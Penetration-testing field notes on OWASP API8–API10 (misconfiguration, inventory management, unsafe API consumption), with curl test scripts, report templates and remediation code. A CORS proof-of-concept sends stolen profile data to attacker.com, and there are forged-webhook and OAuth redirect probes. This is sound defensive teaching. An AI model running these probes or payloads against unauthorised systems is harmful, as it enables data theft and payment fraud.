# OWASP API7–10 — Enterprise Penetration Testing Field Notes

> **Author:** Dheeraj Kumar Jayaswal — Senior Penetration Tester | 5+ Years Enterprise AppSec
>
> **Category:** API Security — OWASP API Security Top 10 (Lower Half)
>
> **Context:** API7 through API10 cover a range of risks that sit below the top-tier findings in frequency but are significant in enterprise environments — unsafe third-party API consumption, security misconfiguration, improper inventory management, and unsafe API consumption patterns. This document covers all four with enterprise-specific context, testing methodology, and report templates.

---

## API7:2023 — Server Side Request Forgery

> See dedicated write-up: [API_SSRF_Enterprise.md](./API_SSRF_Enterprise.md)

SSRF has its own dedicated write-up due to depth of coverage required.

---

## API8:2023 — Security Misconfiguration

**What it covers:** Missing security headers, verbose error messages, exposed debug interfaces, default credentials, insecure CORS, unnecessary HTTP methods enabled.

### Testing Methodology

```bash
BASE="https://api.company.com"

# 1. Response header security audit
echo "=== Security Headers on API Responses ==="
curl -sI "$BASE/api/v1/users/me" \
  -H "Authorization: Bearer TOKEN" | \
  grep -iE "content-security|strict-transport|x-frame|x-content-type|\
            access-control-allow|referrer-policy|server|x-powered"

# Missing headers = Low-Medium findings
# Server: version disclosed = Low (but enables targeted CVE exploitation)
# X-Powered-By: ASP.NET = version disclosure

# 2. CORS misconfiguration
echo ""
echo "=== CORS Testing ==="
curl -sv "$BASE/api/v1/users/me" \
  -H "Authorization: Bearer TOKEN" \
  -H "Origin: https://attacker.example.com" \
  2>&1 | grep -i "access-control"

# Critical if both present:
# Access-Control-Allow-Origin: https://attacker.example.com  (reflected)
# Access-Control-Allow-Credentials: true
# → Any website can make authenticated cross-origin API calls

# Test null origin:
curl -sv "$BASE/api/v1/users/me" \
  -H "Authorization: Bearer TOKEN" \
  -H "Origin: null" \
  2>&1 | grep -i "access-control-allow-origin"

# 3. Verbose error messages
echo ""
echo "=== Error Response Quality ==="
# Send invalid data types to trigger errors:
curl -s "$BASE/api/v1/users/abc" \
  -H "Authorization: Bearer TOKEN" | jq .
# Stack trace = High finding

curl -s -X POST "$BASE/api/v1/users" \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"invalid_json":}' | jq .

# 4. HTTP methods
echo ""
echo "=== HTTP Method Audit ==="
curl -sv -X OPTIONS "$BASE/api/v1/users" \
  -H "Authorization: Bearer TOKEN" \
  2>&1 | grep -i "allow:"
# TRACE method enabled = potential for XST (Cross Site Tracing)
# PUT/DELETE on resource root without specific ID = dangerous

# 5. Debug endpoints
echo ""
echo "=== Debug/Admin Endpoint Check ==="
for path in \
  "actuator" "actuator/env" "actuator/heapdump" \
  "swagger-ui.html" "v2/api-docs" \
  "graphql" "console" "h2-console" \
  ".env" "web.config" "appsettings.json"; do
  code=$(curl -so /dev/null -w "%{http_code}" \
    "$BASE/$path" 2>/dev/null)
  [[ "$code" == "200" ]] && echo "[FOUND] HTTP 200: /$path"
done
```

### Key Enterprise Finding: CORS Misconfiguration

```bash
# CORS wildcard with credentials = any site reads your API responses

# PoC JavaScript (demonstrates impact):
cat << 'JSEOF'
// Attacker hosts this on their site, victim visits it
fetch('https://api.company.com/api/v1/users/me', {
  credentials: 'include'   // sends victim's cookies/auth
})
.then(r => r.json())
.then(data => {
  // Sends victim's full profile to attacker's server
  fetch('https://attacker.com/steal?data=' + JSON.stringify(data));
});
JSEOF
```

### Report Template — API8

```
Finding: CORS Misconfiguration — Reflected Origin With Credentials
Severity: High | CVSS: 8.2

Request:
  GET /api/v1/users/me HTTP/1.1
  Authorization: Bearer TOKEN
  Origin: https://attacker.example.com

Response:
  Access-Control-Allow-Origin: https://attacker.example.com  ← reflected
  Access-Control-Allow-Credentials: true

Impact:
  Any website can make authenticated cross-origin API requests on behalf
  of a logged-in user and read the full response. Attacker hosts a malicious
  page, victim visits it while logged in, attacker silently reads victim's
  profile data, messages, or any other API-accessible data.

Remediation:
  // Define explicit allowed origins — never reflect user-supplied Origin:
  services.AddCors(options => {
      options.AddPolicy("ApiCors", policy => {
          policy.WithOrigins("https://app.company.com",
                             "https://admin.company.com")
                .AllowCredentials()
                .AllowAnyMethod()
                .AllowAnyHeader();
      });
  });
  // Never use: .AllowAnyOrigin().AllowCredentials() — this combination is invalid in .NET
  //            and indicates a CORS misconfiguration even if not thrown as error
```

---

## API9:2023 — Improper Inventory Management

**What it covers:** Undocumented endpoints, deprecated API versions still active, different security posture across environments, missing documentation.

### Testing Methodology

```bash
# 1. Version inventory
echo "=== Active API Versions ==="
for v in v1 v2 v3 v4 beta alpha dev internal legacy; do
  code=$(curl -so /dev/null -w "%{http_code}" \
    "$BASE/api/$v/users" \
    -H "Authorization: Bearer TOKEN" 2>/dev/null)
  [[ "$code" =~ ^(200|401|403)$ ]] && \
    echo "ACTIVE: /api/$v/ → HTTP $code"
done

# 2. Environment exposure
echo ""
echo "=== Environment Exposure ==="
for subdomain in staging dev development test qa uat preview sandbox; do
  code=$(curl -so /dev/null -w "%{http_code}" \
    "https://$subdomain-api.company.com/api/v1/users" 2>/dev/null)
  [[ "$code" =~ ^(200|401|403)$ ]] && \
    echo "ACTIVE: $subdomain-api.company.com → HTTP $code"
done

# 3. Mobile API endpoint inventory
# Check if mobile backend has different security posture:
for host in \
  "api-mobile.company.com" \
  "mobile-api.company.com" \
  "m.company.com/api" \
  "api.company.com/mobile"; do
  code=$(curl -so /dev/null -w "%{http_code}" \
    "https://$host/v1/users" 2>/dev/null)
  echo "$host → HTTP $code"
done

# 4. Undocumented endpoint discovery
ffuf -u "$BASE/api/FUZZ" \
  -w /opt/SecLists/Discovery/Web-Content/api/objects.txt \
  -H "Authorization: Bearer TOKEN" \
  -mc 200,201,401,403 \
  -fs [404_size] | \
  grep -v "^::"
```

### Report Template — API9

```
Finding: Deprecated API Version v1 Active — Security Controls Not Applied
Severity: High

Evidence:
  /api/v1/ is documented as deprecated (Q3 2023 roadmap)
  /api/v1/ responds to all 43 previously active endpoints
  Security controls comparison:
    Rate limiting:   v2 ✓  |  v1 ✗
    IDOR protection: v2 ✓  |  v1 ✗
    JWT validation:  v2 ✓  |  v1 ✗

Remediation:
  nginx — disable v1 with appropriate status:
  location /api/v1/ {
      return 410 '{"error":"API v1 was discontinued on 2023-09-01. Please migrate to /api/v2/"}';
      add_header Content-Type application/json;
  }
```

---

## API10:2023 — Unsafe Consumption of External APIs

**What it covers:** The API consumes third-party services without adequate validation, creating injection, redirect, or data integrity risks through trusted-but-compromised third parties.

### What This Means in Practice

```
Enterprise applications consume dozens of external APIs:
  Payment processor (Stripe, Razorpay)
  Email service (SendGrid, AWS SES)
  SMS/OTP provider (Twilio, MSG91)
  Analytics (Mixpanel, Amplitude)
  Cloud storage (AWS S3, Azure Blob)
  Identity provider (Auth0, Okta)
  Map/geocoding services
  Partner data feeds

API10 vulnerabilities occur when:
  → Data from external APIs is trusted and inserted without validation
  → Webhooks from external services are processed without HMAC verification
  → Redirect URLs from OAuth providers are followed without validation
  → File URLs from CDN responses are fetched without URL validation
  → Partner API responses are rendered in HTML without XSS encoding
```

### Testing Methodology

```bash
# 1. Webhook HMAC validation testing
# Many payment/platform webhooks require HMAC signature verification
# Test if the API validates webhook signatures:

# Send a webhook with wrong HMAC signature:
curl -s -X POST "$BASE/api/v1/webhooks/payment" \
  -H "Content-Type: application/json" \
  -H "X-Stripe-Signature: t=invalid,v1=invalidsignature" \
  -d '{"type":"payment.success","amount":99999}' | jq .

# If processed = HMAC not verified = attacker can trigger any business event
# Report: Unverified payment webhook allows fraudulent payment confirmation

# 2. Open redirect via OAuth response
# After OAuth callback, check if redirect_uri is validated:
curl -sv "https://auth.company.com/oauth/authorize?\
client_id=app123&\
response_type=code&\
redirect_uri=https://attacker.com/steal" \
  2>&1 | grep -i "location"

# If redirects to attacker.com = authorization code theft

# 3. Data injection via external API responses
# If partner API data is inserted into database and displayed:
# Test: does partner API data get XSS-sanitised before rendering?
# This requires understanding data flow — manual code review or
# observing what appears in the application from external sources

# 4. SSRF via external API URLs
# If application fetches URLs returned by external APIs:
# (e.g., avatar_url from OAuth profile, download_url from partner feed)
# Can you control the external API response to inject an internal URL?
# This typically requires access to a partner test account or a MitM position
```

### Report Template — API10

```
Finding: Payment Webhook Processed Without HMAC Signature Verification

Severity: Critical | CVSS: 9.3

Evidence:
  POST /api/v1/webhooks/stripe with invalid X-Stripe-Signature header:
  → HTTP 200: {"success":true,"order_id":8823,"status":"paid"}

  The webhook handler processes the payload regardless of
  signature validity. An attacker can forge any payment event:
  - Mark any order as paid without actual payment
  - Trigger subscription upgrades without charging the customer
  - Generate refund events

Remediation:
  // Stripe webhook HMAC verification (C#):
  string signature = Request.Headers["X-Stripe-Signature"];
  Event stripeEvent;
  try {
      stripeEvent = EventUtility.ConstructEvent(
          requestBody,
          signature,
          webhookSecret    // From Stripe dashboard — stored in secrets manager
      );
  } catch (StripeException e) {
      return BadRequest();  // Invalid signature — reject
  }
  // Only process event if signature validated
```

---

## 🗂️ Combined API7-10 Testing Checklist

```
API8 — SECURITY MISCONFIGURATION
☐ Check all security response headers
☐ CORS: test reflected origin + credentials
☐ CORS: test null origin
☐ Error responses: trigger 400/500 and check for stack traces
☐ HTTP methods: OPTIONS check, TRACE/PUT/DELETE on resource roots
☐ Debug endpoints: Actuator, Swagger, /console, /.env

API9 — IMPROPER INVENTORY MANAGEMENT
☐ Enumerate all API versions (v1-v5, beta, dev, internal)
☐ Compare security posture across all active versions
☐ Test staging/dev subdomains for same controls as production
☐ Test mobile API endpoints separately
☐ Check Wayback Machine for historical endpoints

API10 — UNSAFE CONSUMPTION
☐ Identify all third-party services the API consumes
☐ Test webhook endpoints without valid HMAC signatures
☐ Test OAuth redirect_uri validation
☐ Check if external API data is sanitised before display
☐ Test if URLs from external API responses are fetched server-side
```

---

## 🧭 Key Takeaways

**API8 — CORS misconfiguration is underrated severity.**
A reflected origin with credentials is not just "a misconfiguration" — it is a full cross-origin data theft vector. Any page the victim visits can silently make authenticated API calls and read the responses. In enterprises with sensitive employee or customer data, this is High severity.

**API9 — Deprecated APIs are your highest-return test targets.**
Security improvements go into the current version. Deprecated versions carry every vulnerability that existed before the improvements. Test them first, compare version by version, and document the delta as a security debt finding.

**API10 — Unverified webhooks from payment providers are Critical by definition.**
A payment webhook processed without HMAC verification lets any attacker mark any order as paid. The remediation is one function call in every major payment SDK. The absence of it is a Critical business logic vulnerability that goes beyond technical security into financial integrity.

---

## 🔗 References
- [OWASP API8:2023 — Security Misconfiguration](https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/)
- [OWASP API9:2023 — Improper Inventory Management](https://owasp.org/API-Security/editions/2023/en/0xa9-improper-inventory-management/)
- [OWASP API10:2023 — Unsafe Consumption of APIs](https://owasp.org/API-Security/editions/2023/en/0xaa-unsafe-consumption-of-apis/)
- [Stripe Webhook Signature Verification](https://stripe.com/docs/webhooks/signatures)

---
<div align="center">

*Part of [AppSec From The Trenches](../README.md) — Real notes from 6+ years of enterprise penetration testing.*

[![LinkedIn](https://img.shields.io/badge/LinkedIn-Dheeraj%20Kumar%20Jayaswal-0077B5?style=flat-square&logo=linkedin&logoColor=white)](https://linkedin.com/in/dheerajkumarjayaswal)

</div>
